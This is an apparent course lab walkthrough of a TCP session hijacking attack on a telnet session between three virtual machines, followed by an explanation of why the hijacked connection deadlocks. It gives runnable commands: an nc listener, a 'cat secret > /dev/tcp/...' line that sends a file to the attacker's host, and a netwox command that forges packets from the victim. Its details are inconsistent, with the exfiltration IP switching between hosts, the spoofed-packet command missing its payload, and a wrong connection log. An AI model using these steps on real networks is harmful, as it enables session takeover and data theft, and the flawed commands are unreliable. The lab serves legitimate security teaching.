Lauching the TCP Session Hijacking Attack

Since the TCP protocol does not verify the TCP transport packet, we can easily forge the transport packet after we know the seq and ack information in a TCP connection. 

To see a TCP session hijacking attack in action, we will launch it in our VM environment. Here, take the telnet connection as an example and use three virtual machines for demonstration.

1. User 10.0.2.15

2. Server 10.0.2.16

3. Attacker 10.0.2.17

Attacker tools: wireshark, netwox

Procedures:

To begin with, a user (the victim) first establishes a telnet connection from User to Server, and the attacker would like to hijack this connection, and run an arbitrary command on Server, using the victim’s privilege. To launch a successful TCP session hijacking attack, the attacker needs to know the sequence numbers of the targeted TCP connection, as well as the other essential parameters, including source/destination port numbers and source/destination IP addresses. In the above setup, all three VMs are on the same LAN. Therefore, the attacker can run Wireshark on Attacker to find out all the essential data about the targeted connection. The information of the last data packet sent from User to Server can be found in Wireshard by filtering the records with keywords "talnet" and scrolling down to the last one. Note that there are two sequence numbers in the figure, one says “Sequence number”, and the other says “Next sequence number”. We should use the second number, which equals to the first number plus the length of the data. If the length is zero (e.g., for ACK packets), the packet does not consume any sequence number, so these two numbers are the same, and Wireshark will only display the first number.

Upon clicking the last record in Wireshark, we could know the below information from the sniffed packet:

1. Source: 10.0.2.15 (User)
2. Destination: 10.0.2.16 (Server)
3. Source Port: 44425
4. Destination port: 23
5. Sequence number: 691070837
6. Next Sequence number: 691070839 [this is the sequence number for our attack packet]
7. Acknowledgement number: 3545452504
8. Header length: 32 bytes

Then we construct the TCP payload, which should be the actual command that we would like to run on the server machine. There is a file named "secret" in the user’s account on Server. We can print out the content using the cat command, but the printout will be displayed on the server machine, not the attacker machine. What the attack does is to redirect the printout to the attacker machine. To achieve that goal, we run a TCP server program on the attacker machine, so once our command is successfully executed on Server, we can let the command send its printout to this TCP server. We let the nc (or netcat) utility wait for a connection, and print out whatever comes from that connection. We run the nc command to set up a TCP server listening on port 9090. 

​	seed@Attacker(10.0.2.17): $ nc -l 9090 -v

​	seed@Server(10.0.2.16): $ cat /home/seed/secret > /dev/tcp/10.0.2.17/9090 

The cat command above prints out the content of the secret file, but instead of printing it out locally, the command redirects the output to a file called /dev/tcp/10.0.2.16/9090. This is not a real file; it is a virtual file in the /dev folder, which contains special device files. The /dev/tcp file is a pseudo device: when we place data into /dev/tcp/10.0.2.17/9090, the pseudo device is invoked, which creates a connection with the TCP server listening on port 9090 of 10.0.2.17, and sends the data via the connection. As soon as we run the above cat command, the listening server on the attacker machine will get the content of the file. The result is shown in the following

seed@Attacker(10.0.2.17):˜$ nc -l 9090 -v 

Connection from 10.0.2.17 port 9090 [tcp/*] accepted 

********************

This is top secret! 

********************

The above was just running the command directly on Server. Obviously, attackers do not have access to Server yet, but using the TCP session hijacking attack, they can get the same command into an existing telnet session. To launch the attack, we need to get the hex value of this command string. Here we use a command in Python. See the following:

seed@Attacker(10.0.2.17): $ python 

\>\>\>"\ncat /home/seed/secret   \>

​       /dev/tcp/10.0.2.16/9090\n".encode("hex") ’0a636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f31302e302e322e31362f393039300a’ 

Then it is ready to launch the attack. We need to be able to generate a TCP packet with certain fields set by us. So we use netwox tool 40, which allows us to set each single field of a TCP packet in the command line. Using the information collected above, we set the options of the netwox tool 40 like the following, and run the command. This action forges the User to send a TCP packet to the Server.

seed@Attacker(10.0.2.17): $ netwox 40 --ip4_src 10.0.2.15 --ip4-dst 10.0.2.16 --tcp-src 44425 --tcp-dst 23 --tcp-seqnum 691070839 --tcp-acknum 3545452504

It should be noted that we should run the "nc -l 9090 -v" command first on the attacker machine to wait for the secret. If the attack is successful, the nc command then print out the content of the secret file. If not, it might be caused by the incorrect sequence number. After the successful transmission, the original User will lose the connection, and the Server will regard the attacking machine as the User, so that the attacking machine realizes the session hijacking.

--------------------------------------------------------------------------------------------------

What happens to Hijacked TCP Connection?

After a successful attack, we go to the user machine, and type something in the telnet terminal. The program does not respond to our typing any more -- it freezes. When we look at the Wireshark, we can see that there are many retransmission packets between User (10.0.2.15) and Server (10.0.2.16).

The injected data by the attacker messes up the sequence number from User to Server. When Server replies to our spoofed packet, it acknowledges the sequence number (plus the payload size) created by us, but User has not reached that number yet, so it simply discards the reply packet from Server and will not acknowledge receiving the packet. Without being acknowledged, Server thinks that its packet is lost, so it keeps retransmitting the packet, which keeps getting dropped by User. 

On the other end, when we type something in the telnet program on User, the sequence number used by the client has already been used by the attack packet, so the server will ignore these data, treating them as duplicate data. Without getting any acknowledgment, the client will keep resending the data. Basically, the client and the server will enter a deadlock, and keep resending their data to each other and dropping the data from the other side. After a while, TCP will disconnect the connection. 

